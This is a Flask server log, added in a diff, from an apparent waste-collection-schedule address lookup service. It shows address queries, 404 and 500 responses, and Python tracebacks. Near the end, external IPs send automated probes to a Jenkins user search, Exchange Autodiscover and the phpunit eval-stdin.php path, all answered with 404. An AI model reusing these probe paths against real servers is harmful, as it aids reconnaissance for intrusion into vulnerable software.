+127.0.0.1 - - [27/Jun/2025 04:22:51] "GET /collections?address=16%20Henry%20st,%20windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:23:02] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:24:15] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:24:15] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:26:39] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:26:39] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:27:13] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:27:13] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:27:35] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:27:41] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:27:41] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:28:50] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:28:50] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:29:15] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:29:18] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:29:19] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:29:56] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:29:56] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:30:12] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:30:12] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:32:10] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:32:10] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:32:34] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:32:34] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:34:22] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:34:22] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+[2025-06-27 04:34:51,711] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 61, in get_collections
+    Source = load_source(module)
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 37, in load_source
+    spec.loader.exec_module(mod)
+  File "<frozen importlib._bootstrap_external>", line 883, in exec_module
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "/home/sihanren409/hacs_waste_collection_schedule/custom_components/waste_collection_schedule/waste_collection_schedule/source/impactapps_com_au.py", line 6, in <module>
+    from waste_collection_schedule.exceptions import (
+ModuleNotFoundError: No module named 'waste_collection_schedule.exceptions'; 'waste_collection_schedule' is not a package
+127.0.0.1 - - [27/Jun/2025 04:34:51] "GET /collections?address=16%20Henry%20street HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:35:04] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:35:07] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:35:21] "GET /collections?address=16%20Henry%20street,%20Windsor,%20vic HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:35:37] "GET /collections?address=30%20foot%20street,%20Frankston HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:35:40] "GET /collections?address=30%20foot%20street,%20Frankston HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:38:01] "GET /collections?address=30%20foot%20street,%20Frankston HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:38:01] "GET /collections?address=30%20foot%20street,%20Frankston HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:38:12] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:43:29] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:43:29] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:43:42] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:43:42] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:44:04] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+[2025-06-27 04:44:45,970] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:44:45] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 04:44:46,534] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:44:46] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 04:45:37,954] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:45:37] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 04:45:38,502] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:45:38] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 04:45:53,970] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:45:53] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 04:45:54,563] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:45:54] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 04:46:37,606] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:46:37] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+[2025-06-27 04:46:38,145] ERROR in app: Exception on /collections [GET]
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File "/home/sihanren409/hacs_waste_collection_schedule/server.py", line 47, in get_collections
+    council = get_council(address)
+  File "/home/sihanren409/hacs_waste_collection_schedule/council_lookup.py", line 14, in get_council
+    for component in data.get('results', [])[0].get('address_components', []):
+IndexError: list index out of range
+127.0.0.1 - - [27/Jun/2025 04:46:38] "GET /collections?address=Vfsfv HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:46:59] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:46:59] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:47:23] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:47:23] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 04:47:34] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:47:36] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:47:53] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:47:53] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:49:03] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:49:04] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:49:17] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:49:17] "GET /collections?address=16%20Henry%20street,%20Windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:50:22] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:50:22] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:50:28] "GET /collections?address=2–16,%20Ellis%20St,%20San%20Francisco,%20CA,%2094108 HTTP/1.0" 404 -
+176.65.149.109 - - [27/Jun/2025 04:50:35] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 04:52:53] "GET /collections?address=14%20Henry%20street,%20windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:52:53] "GET /collections?address=14%20Henry%20street,%20windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:56:27] "GET /collections?address=14%20Henry%20street,%20windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 04:56:27] "GET /collections?address=14%20Henry%20street,%20windsor HTTP/1.0" 200 -
+204.76.203.212 - - [27/Jun/2025 04:56:49] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 04:58:17] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:58:17] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:58:29] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:59:07] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 04:59:07] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:00:31] "GET /collections?address=16%20Henry%20St,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 05:00:38] "GET /collections?address=16%20Henry%20Street,%20windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 05:00:40] "GET /collections?address=16%20Henry%20Street,%20windsor HTTP/1.0" 200 -
+79.124.58.198 - - [27/Jun/2025 05:02:56] "GET /securityRealm/user/admin/search/index?q=a HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 05:03:38] "GET /collections?address=16%20Henry%20Street,%20windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 05:03:39] "GET /collections?address=16%20Henry%20Street,%20windsor HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 05:04:04] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:04:04] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+204.76.203.206 - - [27/Jun/2025 05:04:17] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 05:06:19] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:06:19] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+79.124.58.198 - - [27/Jun/2025 05:12:10] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 05:12:14] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:12:15] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:12:25] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:13:22] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:13:22] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:15:55] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:15:56] "GET /collections?address=16%20Henry%20St,%20Windsor,%20VIC,%20Australia HTTP/1.0" 500 -
+127.0.0.1 - - [27/Jun/2025 05:16:04] "GET /collections?address=16%20Henry%20St,%20Windsor HTTP/1.0" 404 -
+79.124.58.198 - - [27/Jun/2025 05:16:09] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 05:16:37] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 05:16:52] "GET /collections?address=58%20story%20street,%20parkville HTTP/1.0" 200 -
+127.0.0.1 - - [27/Jun/2025 05:17:10] "GET /collections?address=16%20henry%20st,%20windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 05:19:17] "GET /collections?address=16%20henry%20st,%20windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 05:19:26] "GET /collections?address=16%20henry%20st,%20windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 05:20:07] "GET /collections?address=16%20henry%20st,%20windsor HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 05:20:55] "GET /collections?address=16%20henry%20st,%20windsor HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 05:21:55] "GET /collections?address=16%20Henry%20St,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 05:21:56] "GET /collections?address=16%20Henry%20St,%20Windsor HTTP/1.0" 404 -
+127.0.0.1 - - [27/Jun/2025 05:22:04] "GET /collections?address=16%20Henry%20Street,%20Windsor HTTP/1.0" 200 -
+79.124.58.198 - - [27/Jun/2025 05:22:27] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - [27/Jun/2025 05:22:58] "GET /collections?address=16%20Henry%20Street,%20Windsor,%20vic HTTP/1.0" 500 -
